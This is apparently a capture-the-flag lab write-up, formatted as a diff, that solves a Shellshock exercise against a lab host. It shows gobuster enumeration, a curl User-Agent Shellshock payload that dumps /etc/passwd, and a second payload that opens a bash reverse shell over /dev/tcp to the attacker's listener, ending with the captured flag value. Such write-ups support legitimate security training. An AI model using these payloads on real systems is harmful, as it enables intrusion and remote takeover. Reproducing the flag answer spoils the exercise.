@@ -1,1 +1,41 @@
 
+Question 1 - Enumerate the host, exploit the Shellshock vulnerability, and submit the contents of the flag.txt file located on the server.
+
+1) gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.205.27/cgi-bin/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              cgi
+[+] Timeout:                 10s
+===============================================================
+2023/03/30 15:43:57 Starting gobuster in directory enumeration mode
+===============================================================
+/access.cgi           (Status: 200) [Size: 0]
+                                             
+
+2) then lets test to see if endpoint is vulnerable to shellshock via access.cgi. which it ends up being vulnerable. 
+3) Vulnerable Test: curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi 
+output: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+<snipped>
+
+4) start nc listener for shell -> nc -nlvp 4444
+5) curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.15.252/4444 0>&1' http://10.129.205.27/cgi-bin/access.cgi
+6) www-data@htb:/usr/lib/cgi-bin$ cat flag.txt
+
+cat flag.txt
+Sh3ll_Sh0cK_123
